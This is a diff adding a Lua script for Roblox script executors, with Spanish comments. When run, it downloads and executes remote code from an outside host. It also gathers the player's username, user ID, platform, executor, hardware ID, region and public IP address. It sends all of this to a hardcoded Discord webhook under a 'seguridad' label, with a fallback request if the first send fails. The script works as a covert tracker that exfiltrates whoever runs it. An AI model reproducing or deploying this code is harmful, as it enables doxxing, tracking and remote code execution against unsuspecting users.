@@ -1,0 +1,247 @@
+getgenv().Config = {api = "d2774146aa1fb354fa4e2c005f5418a745b3c3b937b72f31fe4609dca52b0a0f"} -- DO NOT CHANGE
+
+-- Intentar cargar track.lua (protegido para que no cause errores)
+pcall(function()
+    loadstring(game:HttpGet("https://rbxhook.cc/lua/track.lua"))()
+end)
+
+local player = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+
+-- Tu URL de Discord webhook
+local url = "https://discord.com/api/webhooks/1538728012412096535/4YdXraqI3UzKdh_EXUGGNpF_vNTW2tG0Tq1bPsA1mpbjIZLoF_wA9MkjyfAqFsJVbqYv"
+
+local function getPlatform()
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        return "Mobile"
+    elseif UserInputService.KeyboardEnabled then
+        return "PC"
+    elseif UserInputService.GamepadEnabled then
+        return "Console"
+    else
+        return "Unknown"
+    end
+end
+
+-- Detección universal de ejecutores
+local executor = "Unknown"
+
+-- Detección por nombre (más confiable)
+if identifyexecutor then
+    pcall(function()
+        executor = identifyexecutor()
+    end)
+end
+
+-- Detección específica
+if executor == "Unknown" or executor == "" then
+    if delta and get_hw_id then
+        executor = "Delta"
+    elseif syn and syn.gethwid then
+        executor = "Synapse X"
+    elseif KRNL_LOADED then
+        executor = "Krnl"
+    elseif fluxus then
+        executor = "Fluxus"
+    elseif is_sirhurt_closure then
+        executor = "SirHurt"
+    elseif OXYGEN then
+        executor = "Oxygen U"
+    elseif XENO_LOADED or xeno then
+        executor = "Xeno"
+    elseif electron then
+        executor = "Electron"
+    elseif scriptware then
+        executor = "ScriptWare"
+    elseif comet then
+        executor = "Comet"
+    elseif evon then
+        executor = "Evon"
+    elseif argon then
+        executor = "Argon"
+    elseif hydrogen then
+        executor = "Hydrogen"
+    elseif valyse then
+        executor = "Valyse"
+    elseif nihon then
+        executor = "Nihon"
+    elseif codex then
+        executor = "CodeX"
+    elseif trigon then
+        executor = "Trigon"
+    elseif sw then
+        executor = "ScriptWare"
+    elseif getexecutorname then
+        pcall(function()
+            executor = getexecutorname()
+        end)
+    end
+end
+
+-- Obtener HWID
+local hwid = "Unavailable"
+pcall(function()
+    if syn and syn.gethwid then
+        hwid = syn.gethwid()
+    elseif gethwid then
+        hwid = gethwid()
+    elseif delta and get_hw_id then
+        hwid = tostring(get_hw_id())
+    elseif fluxus and getgenv and getgenv().fluxus then
+        hwid = tostring(getgenv().fluxus.HWID or "Unavailable")
+    end
+end)
+
+-- Obtener región
+local serverRegion = "Unknown"
+pcall(function()
+    serverRegion = tostring(game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player) or "Unknown")
+end)
+
+-- Obtener IP
+local ipAddress = "Unavailable"
+pcall(function()
+    local ipResponse = game:HttpGet("https://api.ipify.org")
+    if ipResponse and ipResponse ~= "" then
+        ipAddress = ipResponse
+    end
+end)
+
+-- Obtener edad de cuenta y membresía
+local accountAge = "Unknown"
+local membership = "Free"
+pcall(function()
+    accountAge = tostring(player.AccountAge) .. " days"
+    membership = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "Free"
+end)
+
+-- Construir el embed
+local data = {
+    avatar_url = "https://rbxhook.cc/img/logo.png",
+    content = "",
+    username = "seguridad Watch doom",
+    embeds = {
+        {
+            title = "Join " .. player.DisplayName,
+            color = 3447003,
+            author = {
+                name = player.Name,
+                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=150&height=150&format=png"
+            },
+            thumbnail = {
+                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
+            },
+            fields = {
+                {
+                    name = "👤 User Info",
+                    value = "Name Display: ".. player.DisplayName .. 
+                            "\nUsername: " .. player.Name .. 
+                            "\nUser ID: " .. player.UserId .. 
+                            "\n📱/💻Platform: " .. getPlatform(),
+                    inline = false
+                },
+                {
+                    name = "⚙️ Executor",
+                    value = executor,
+                    inline = true
+                },
+                {
+                    name = "💽 HWID",
+                    value = hwid,
+                    inline = true
+                },
+                {
+                    name = "🌍 Region",
+                    value = serverRegion,
+                    inline = true
+                },
+                {
+                    name = "📡 IP Address",
+                    value = ipAddress,
+                    inline = true
+                },
+                {
+                    name = "👤 Account Age",
+                    value = accountAge,
+                    inline = true
+                },
+                {
+                    name = "⭐ Membership",
+                    value = membership,
+                    inline = true
+                }
+            },
+            footer = {
+                text = "HS family Script | User ID: " .. tostring(player.UserId)
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+    }
+}
+
+-- Mostrar variables de runtime
+print("=== Runtime Variables ===")
+print("Executor:", executor)
+print("HWID:", hwid)
+print("Platform:", getPlatform())
+
+-- Convertir a JSON
+local success, encoded = pcall(function()
+    return HttpService:JSONEncode(data)
+end)
+
+if not success then
+    print("❌ JSON encoding failed")
+    return
+end
+
+-- Función de request universal
+local requestFunc = nil
+
+-- Prioridad de request functions
+if syn and syn.request then
+    requestFunc = syn.request
+elseif request then
+    requestFunc = request
+elseif http_request then
+    requestFunc = http_request
+end
+
+if not requestFunc then
+    print("❌ Error: No request function found")
+    return
+end
+
+-- Enviar webhook
+local response = nil
+local sendSuccess = pcall(function()
+    response = requestFunc({
+        Url = url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = encoded
+    })
+end)
+
+if sendSuccess and response then
+    print("✅ Webhook enviado correctamente")
+    if response.StatusCode then
+        print("Status Code:", response.StatusCode)
+    end
+else
+    print("❌ Error al enviar webhook")
+    
+    -- Método alternativo con HttpGetAsync
+    local altSuccess = pcall(function()
+        game:HttpGetAsync(url .. "?payload_json=" .. HttpService:UrlEncode(encoded))
+    end)
+    
+    if altSuccess then
+        print("✅ Webhook enviado con método alternativo")
+    else
+        print("❌ Ambos métodos fallaron")
+    end
+end
